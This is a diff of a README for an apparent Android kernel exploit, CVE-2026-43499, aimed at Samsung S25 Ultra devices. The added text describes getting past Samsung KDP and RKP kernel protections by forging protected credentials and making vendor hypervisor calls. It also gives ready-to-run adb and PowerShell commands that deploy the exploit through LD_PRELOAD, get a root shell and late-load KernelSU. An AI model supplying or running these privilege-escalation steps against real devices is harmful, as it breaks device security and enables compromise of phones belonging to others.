@@ -42,6 +42,23 @@ The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).
 - Added a KDP-safe `system_unbound_wq` user-mode-helper root path.
 - Added a socket-backed root command helper at
   `/data/local/tmp/cve-2026-43499-root`.
+- Restored upstream KernelSU `sucompat`: allowed callers are redirected to the
+  installed `/data/adb/ksud`, so the original option parser, shell handling,
+  Root Profile, mount namespace, capabilities, and SELinux behavior are used.
+- Added a task-scoped Samsung KDP credential path. A root kernel worker asks
+  the firmware's own `prepare_ro_creds(COPY_CREDS)` implementation to create a
+  protected credential with the correct target-task back pointer, then installs
+  that credential while the caller is blocked. KDP remains enabled globally.
+- Registers the protected credential page with the SM8750 KDP ABI
+  (`UH_APP_KDP=0xc300c002`, `SET_CRED_PGD=0x06`). The vendor `uh_call` entry is
+  reached through a `noinline __nocfi` wrapper because this firmware does not
+  export a KCFI-compatible call target.
+- Keeps the Samsung RKP-compatible kprobe syscall routing; the syscall table is
+  not patched when RKP rejects writes.
+- Added a built-in root-helper `--late-load` request that stages the patched
+  `ksud`, enters a private mount namespace, and executes it through the
+  `/system/bin/logcat` mount path without a second UID-0 exec from
+  `/data/local/tmp`.
 - Restores the global ashmem FOPS pointer immediately after establishing the
   arbitrary read/write primitive.
 - Retains reclaimed pages in a detached `cve43499-hold` process after success
@@ -78,6 +95,70 @@ adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-4349
 adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
 adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
 ```
+
+## KernelSU late-load
+
+The repository contains only the verified KernelSU build artifacts. KernelSU
+source trees, unused device profiles, and intermediate build files are not
+included:
+
+```text
+kernelsu/kernelsu.ko
+kernelsu/ksud-s25u-kdp
+```
+
+Verified SHA-256 values:
+
+```text
+54676e77a87a86203c825695199b20abe5b464b5766e200185968a990c57b235  kernelsu/kernelsu.ko
+fa3edcc7d168637394877b30cb1f909d762dda788ec14051f4ae79edd6562d63  kernelsu/ksud-s25u-kdp
+```
+
+`ksud-s25u-kdp` embeds the matching module used by `late-load`.
+`kernelsu.ko` is included as the independently inspectable build output. Do
+not combine either file with a loader or module from another build.
+
+After the exploit reports `done=1 root=1`, run the Windows loader from the
+repository root. It verifies the loader hash, confirms bootstrap root, uploads
+the loader and its staging copy, invokes the root helper's built-in late-load
+path, and verifies the loaded module and installed daemon:
+
+```powershell
+powershell -ExecutionPolicy Bypass -File .\run-s25u.ps1
+```
+
+The script intentionally does not start KernelSU Manager. Verify the runtime
+before opening Manager:
+
+```powershell
+adb shell "grep '^kernelsu ' /proc/modules; getenforce"
+adb shell "su -c 'id; pwd; getenforce'"
+adb logcat -d -s KernelSU:I
+```
+
+Expected `su` identity:
+
+```text
+uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
+```
+
+The equivalent manual Windows PowerShell sequence is:
+
+```powershell
+adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
+adb push .\kernelsu\ksud-s25u-kdp /data/local/tmp/ksud-s25u-kdp
+adb push .\kernelsu\ksud-s25u-kdp /data/local/tmp/.ksud-stage
+adb shell "chmod 755 /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage"
+adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
+"late_load_exit=$LASTEXITCODE"
+adb shell "grep '^kernelsu ' /proc/modules; getenforce"
+adb shell "su -c 'id; pwd; getenforce'"
+```
+
+There is no separate userspace root broker in this path. Authorization,
+per-app Root Profiles, mount namespaces, capabilities, command options, and
+shell selection are handled by KernelSU's original `sucompat` and `ksud`
+implementation. The late-loaded runtime lasts until reboot.
 
 The default run makes up to 16 independent attempts. Each failed child exits
 before the next attempt, so its file descriptors and heap-shaping allocations
